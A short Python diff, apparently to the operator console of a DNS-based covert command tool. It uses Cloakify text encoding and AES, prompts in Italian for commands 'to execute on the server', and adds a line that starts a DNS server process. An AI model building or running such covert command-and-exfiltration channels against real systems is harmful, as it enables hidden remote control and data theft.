@@ -1,5 +1,7 @@
 import subprocess
 import os
+import multiprocessing
+import dns_server
 from decloakify import Decloakify
 from aes_encrypt import decrypt_message, encrypt_message
 from cloakify import Cloakify
@@ -55,7 +57,6 @@ def receive_response():
         
     # Decloakificare il comando
     print("Decloakifying...")
-    print("Decloakifying...")
     if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
         print("Requesting re-trasmission")
         send_command('rt')
@@ -78,6 +79,7 @@ def receive_response():
 
 
 if __name__ == "__main__":
+    subprocess.Popen(['python', 'dns_server.py'])
     while True:
         command = input("Inserisci il comando da eseguire sul server: ")
         send_command(command)
